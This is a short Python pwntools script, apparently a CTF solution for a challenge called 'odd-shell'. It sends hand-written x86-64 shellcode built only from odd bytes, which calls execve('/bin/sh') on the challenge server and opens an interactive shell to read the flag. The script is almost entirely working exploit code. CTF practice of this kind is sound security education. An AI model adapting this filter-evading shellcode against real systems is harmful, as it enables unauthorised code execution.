#!/usr/bin/env python3

# Written by Richard Liu

from pwn import *

r = remote('odd-shell.chal.uiuc.tf', 1337)

r.recvuntil(b':\n')

assembly = '''
.intel_syntax noprefix
.global _start

_start:
    // the is '/bin/sh\x00' shifted left by 2
    mov r15, 0x1A1CDBDB9A589BD
    // we need a mask because there are still a few even bytes
    mov r13, 0xFFFFFDFFFFFFFDFD
    shr r13, 1
    // get rid of even bytes
    and r13, r15
    // shift to get original /bin/sh string
    shr r13, 1
    shr r13, 1
    // now it's on the stack
    push r13

    // get rsp by using the fact that rbp is rsp + 0x28 at the start
    push rbp
    pop r13
    // subtract 0x30 = 0x28 + 0x8 (pushed /bin/sh string)
    sub r13, 0x2f
    sub r13, 0x01
    push r13
    pop rdi

    // zero registers
    xor r11d, r11d
    lea esi, [r11d]
    lea edx, [r11d]

    // need to get 0x3b to rax for execve syscall
    xor ebx, ebx
    mov bl, 0x3b
    mov r11d, ebx
    lea eax, [r11d]

    // this is alread odd :)
    syscall
'''

payload = asm(assembly, arch='amd64')

r.sendline(payload)

# popped a shell, run 'cat /flag' to get the flag
r.interactive()
